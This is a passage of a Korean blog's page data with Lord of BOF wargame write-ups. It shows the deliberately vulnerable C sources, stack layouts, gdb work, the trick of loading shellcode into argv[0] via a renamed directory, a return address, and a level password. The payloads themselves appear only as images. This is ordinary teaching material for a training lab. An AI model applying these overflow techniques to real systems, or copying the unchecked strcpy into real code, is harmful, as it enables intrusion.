<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argc must be two!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check the length of argument</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argument is too long!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// one more!</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack frame pointer |\r\n| Return Address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>stack frame은 이전 문제와 동일하다. 단 argument를 강제하는 분기문이 생겨서 이전처럼 argument를 여러 개 생성하여 공격하는 방식이 통하지 않게 되었다.\r\n하지만 위의 코드는 argv[0] 값을 검사하지 않고 있다. 하드링크를 만들고 거기에 쉘코드를 적재하여 이를 호출해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA7ElEQVR42pWM227DIBBEF1gMJDZ2bFxgL66iVlXVqPn/z6ucP+g8HM15mAEVOY5DRHpvRMREvfdaKzOv69pPa3rotm3Ep5RSVLXW+vt8goqIsIioCPNZzi8VZtJDz8F515i5UycmZm69lVIejx9QfVdRIqq1EXGtdbmtwxCmKU9THoZorbMOrUXn0DpvLSJ6AChlhzl/T9M9588Y98uljeM9RrpeP2LoMVBKHEMLoYawp6QhvKUkMVZrl9a+II2MfvJ+QRwRR+9n7/Mw3LzP3s+IV2OsMe5FhBeNcQAwzwtsUuIlwH9ijAGAnPMfasMVNqT5gB8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b21235753cc2d07d8049f2f73241b522/c9b55/0.webp 165w,\n/static/b21235753cc2d07d8049f2f73241b522/f2908/0.webp 330w,\n/static/b21235753cc2d07d8049f2f73241b522/7eb86/0.webp 642w\"\n              sizes=\"(max-width: 642px) 100vw, 642px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b21235753cc2d07d8049f2f73241b522/04c57/0.png 165w,\n/static/b21235753cc2d07d8049f2f73241b522/d9ecf/0.png 330w,\n/static/b21235753cc2d07d8049f2f73241b522/1bba8/0.png 642w\"\n            sizes=\"(max-width: 642px) 100vw, 642px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b21235753cc2d07d8049f2f73241b522/1bba8/0.png\"\n            alt=\"mkdir\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>디렉토리 생성을 목적으로 하였기 때문에 일부러 \\x2f가 없는 쉘코드를 사용하였다. 그런데 위와 같이 생성한 디렉토리에 하드링크 생성이 되지 않기 때문에 동일한 길이의 이름을 가진 디렉토리를 생성한 후 이후에 이것의 이름을 바꾸기로 하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtUlEQVR42k3MQZLCIBCF4YZkOlghNIFFiCZKSSMxZs4w3v9Ullpa89e3eZsHnDnnzMwxxsTpFOM0z4nTut2ut3X95zu3360s5e9+h3JdyrJwfn7E8zll5pwP04EsGSJjjKE3sr19c85prS+lwPF0HMeAiHVd9b0VQmitEREAlFJd1+1eNUrBJyEEAAzDAGEMzrsGG0Tc78eqrrx3bdsCgPd+midrLRE579E28kcKEFJKAAghPAB1zhQVMIggcgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1268f61b6d88ab93af14388528df7ac9/c9b55/1.webp 165w,\n/static/1268f61b6d88ab93af14388528df7ac9/f2908/1.webp 330w,\n/static/1268f61b6d88ab93af14388528df7ac9/7eb86/1.webp 642w\"\n              sizes=\"(max-width: 642px) 100vw, 642px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1268f61b6d88ab93af14388528df7ac9/04c57/1.png 165w,\n/static/1268f61b6d88ab93af14388528df7ac9/d9ecf/1.png 330w,\n/static/1268f61b6d88ab93af14388528df7ac9/1bba8/1.png 642w\"\n            sizes=\"(max-width: 642px) 100vw, 642px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1268f61b6d88ab93af14388528df7ac9/1bba8/1.png\"\n            alt=\"rename1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAfklEQVR42o3NwQ4CIQxF0VYESl+ZZARW1gX//5NmQDeuvKvTpMmjMYaZ1WqlFABmBqBIEclmSCldFFFVADFGBY7jkCxzThpjqCoz375thhD2eWGb+b4QQiCi1hrNOf3l7s9a62dWi60AiMiP15ellHrv5O7n48xZ6O+YeS+/ATySB93/ikKpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4ea33a24abf3932a5a1685aa98cea40d/c9b55/2.webp 165w,\n/static/4ea33a24abf3932a5a1685aa98cea40d/f2908/2.webp 330w,\n/static/4ea33a24abf3932a5a1685aa98cea40d/de042/2.webp 641w\"\n              sizes=\"(max-width: 641px) 100vw, 641px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4ea33a24abf3932a5a1685aa98cea40d/04c57/2.png 165w,\n/static/4ea33a24abf3932a5a1685aa98cea40d/d9ecf/2.png 330w,\n/static/4ea33a24abf3932a5a1685aa98cea40d/c7dcc/2.png 641w\"\n            sizes=\"(max-width: 641px) 100vw, 641px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4ea33a24abf3932a5a1685aa98cea40d/c7dcc/2.png\"\n            alt=\"rename2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>연속되는 Z(0x5a)가 시작되는, 즉 argv[0]의 시작 주소는 0xbffff9a8이다. 이 디렉토리의 이름을 쉘코드를 포함한 문자열로 바꾼 후 진입하여 위에서 구한 주소지를 응용해 페이로드를 다음과 같이 작성하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA7ElEQVR42pWM227DIBBEF1gMJDZ2bFxgL66iVlXVqPn/z6ucP+g8HM15mAEVOY5DRHpvRMREvfdaKzOv69pPa3rotm3Ep5RSVLXW+vt8goqIsIioCPNZzi8VZtJDz8F515i5UycmZm69lVIejx9QfVdRIqq1EXGtdbmtwxCmKU9THoZorbMOrUXn0DpvLSJ6AChlhzl/T9M9588Y98uljeM9RrpeP2LoMVBKHEMLoYawp6QhvKUkMVZrl9a+II2MfvJ+QRwRR+9n7/Mw3LzP3s+IV2OsMe5FhBeNcQAwzwtsUuIlwH9ijAGAnPMfasMVNqT5gB8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b21235753cc2d07d8049f2f73241b522/c9b55/0.webp 165w,\n/static/b21235753cc2d07d8049f2f73241b522/f2908/0.webp 330w,\n/static/b21235753cc2d07d8049f2f73241b522/7eb86/0.webp 642w\"\n              sizes=\"(max-width: 642px) 100vw, 642px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b21235753cc2d07d8049f2f73241b522/04c57/0.png 165w,\n/static/b21235753cc2d07d8049f2f73241b522/d9ecf/0.png 330w,\n/static/b21235753cc2d07d8049f2f73241b522/1bba8/0.png 642w\"\n            sizes=\"(max-width: 642px) 100vw, 642px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b21235753cc2d07d8049f2f73241b522/1bba8/0.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: aspirin</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"c65de08a-33ba-511d-bf9a-4246bf9f59c3","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-08/","title":"LOB 8번 (orge -> troll)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/9aae59d0f8212e5d76085639332d8242/b7b7c/0.png","srcSet":"/static/9aae59d0f8212e5d76085639332d8242/182cc/0.png 91w,\n/static/9aae59d0f8212e5d76085639332d8242/2c6ad/0.png 181w,\n/static/9aae59d0f8212e5d76085639332d8242/b7b7c/0.png 362w","sizes":"(min-width: 362px) 362px, 100vw"},"sources":[{"srcSet":"/static/9aae59d0f8212e5d76085639332d8242/98c2e/0.webp 91w,\n/static/9aae59d0f8212e5d76085639332d8242/483ec/0.webp 181w,\n/static/9aae59d0f8212e5d76085639332d8242/def5b/0.webp 362w","type":"image/webp","sizes":"(min-width: 362px) 362px, 100vw"}]},"width":660,"height":399.2817679558011}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - skeleton\r\n        - argv hunter\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">,</span> saved_argc<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check the length of argument</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argument is too long!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// argc saver</span>\r\n        saved_argc <span class=\"token operator\">=</span> argc<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// ultra argv hunter!</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>saved_argc<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| saved_argc[4] |\r\n| buffer[40] |\r\n| Stack frame pointer |\r\n| Return address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>환경변수부터 buffer 40바이트, argv[0]까지 모두 0으로 초기화시키고 있다. 초기화가 이루어진 후 스택에 남아있는 부분이 있는지 gdb를 통해 알아보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 362px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA8UlEQVR42kWQ23LDIAwFAYekNY4TbHERxhKGTP7/Ezu4mXYf9KJZHUmi1vp4PLz325attTln50AIIU+UUn9VKvmPOHm/3yus4FzeMjO3VrctjeMYY1yWZQXoo0OIGH3wcJJSmozpcq2VaGemeZ4xIRM5B9frVSklhLjf77XV5/M5qKGUQpS11mf3zC6l7F1mY0zESEQhBLssl8vQ5XneKUvVNydm4j2E2F51HL8/ycx8HOWTzIyI4OBXHo2p9dD6IqUshYl2731rLe+b1lokTD4ERJymCQAiRnBgrR2Gvvbt9lUKT1O/8POFdcUYQwjl4B+v4hiSWfw9vQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9aae59d0f8212e5d76085639332d8242/c9b55/0.webp 165w,\n/static/9aae59d0f8212e5d76085639332d8242/f2908/0.webp 330w,\n/static/9aae59d0f8212e5d76085639332d8242/c2de8/0.webp 362w\"\n              sizes=\"(max-width: 362px) 100vw, 362px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9aae59d0f8212e5d76085639332d8242/04c57/0.png 165w,\n/static/9aae59d0f8212e5d76085639332d8242/d9ecf/0.png 330w,\n/static/9aae59d0f8212e5d76085639332d8242/10600/0.png 362w\"\n            sizes=\"(max-width: 362px) 100vw, 362px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9aae59d0f8212e5d76085639332d8242/10600/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAhUlEQVR42mXNyw7DIAxEUbupmkgQQWh42GAg5P//saJddlZ3MzowrntcXVpzzkViopQ5x+ABIIRgjAGA1rtUqbVaY4sIEXt/btsKY9y9tVLksJaLlJyZOcZ5du8zET2XRSmltdp3va6v2bvGBwIA9H7VKolIa0U8ZaLkv7Jzx0/+HyIC4gcbDguswOLOBwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/078b956a3d5bcb574da5b170cd9c35b7/c9b55/1.webp 165w,\n/static/078b956a3d5bcb574da5b170cd9c35b7/f2908/1.webp 330w,\n/static/078b956a3d5bcb574da5b170cd9c35b7/b6b2f/1.webp 417w\"\n              sizes=\"(max-width: 417px) 100vw, 417px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/078b956a3d5bcb574da5b170cd9c35b7/04c57/1.png 165w,\n/static/078b956a3d5bcb574da5b170cd9c35b7/d9ecf/1.png 330w,\n/static/078b956a3d5bcb574da5b170cd9c35b7/f27fb/1.png 417w\"\n            sizes=\"(max-width: 417px) 100vw, 417px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/078b956a3d5bcb574da5b170cd9c35b7/f27fb/1.png\"\n            alt=\"disas2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>main+368에서 leave하고 있다. 이 지점까지 실행시킨 후 스택에 남은 공간이 있는지의 여부를 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 320px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.303030303030305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqUlEQVR42n2P2w6DIBAFoaaigLVR8QJ12QW0//+HjbXxSTuPJzuZLJsBlxTbtun73pjOOtc2z34YAEGIO79tcM7ZKev6TilgIPDeuUkpyb886nocRztZrXWe5+fysqwxBk8IiM5ZIX53Uum6fjDGLrO7nGJAIkD03peF2HeldVVp9p8lbWUkmj3CDLIsDlkrxTnPsuxS3n8G9EBESEdZCNEZM8NLyvJK/gByDw+kdyPTtQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/866d21dfb4856a8fc7479b9f003ce7f1/c9b55/2.webp 165w,\n/static/866d21dfb4856a8fc7479b9f003ce7f1/4c812/2.webp 320w\"\n              sizes=\"(max-width: 320px) 100vw, 320px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/866d21dfb4856a8fc7479b9f003ce7f1/04c57/2.png 165w,\n/static/866d21dfb4856a8fc7479b9f003ce7f1/72799/2.png 320w\"\n            sizes=\"(max-width: 320px) 100vw, 320px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/866d21dfb4856a8fc7479b9f003ce7f1/72799/2.png\"\n            alt=\"stack mem\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 389px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 8.484848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAXUlEQVR42j3LQQ6AIAwF0ULLCleA8mlVDHr/MxqNcVZvMzSu8xij902Eicg5V8ocgnjvmdl/8e8Xj4MIqVlTtdWEn5mI4jRVwExTznvv2pBTroAqYoy2GoB5WVDrDUqbBntKcrqhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/267f2f6c64fe9d3e672028b69986dcbc/c9b55/3.webp 165w,\n/static/267f2f6c64fe9d3e672028b69986dcbc/f2908/3.webp 330w,\n/static/267f2f6c64fe9d3e672028b69986dcbc/b1289/3.webp 389w\"\n              sizes=\"(max-width: 389px) 100vw, 389px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/267f2f6c64fe9d3e672028b69986dcbc/04c57/3.png 165w,\n/static/267f2f6c64fe9d3e672028b69986dcbc/d9ecf/3.png 330w,\n/static/267f2f6c64fe9d3e672028b69986dcbc/00a4e/3.png 389w\"\n            sizes=\"(max-width: 389px) 100vw, 389px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/267f2f6c64fe9d3e672028b69986dcbc/00a4e/3.png\"\n            alt=\"stack mem2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>메모리 끝에서 경로가 남아있는 부분을 찾았다. argv[0]부분이 이 주소지에 아직 남아있는 것을 발견하였다. B가 250번 반복되는 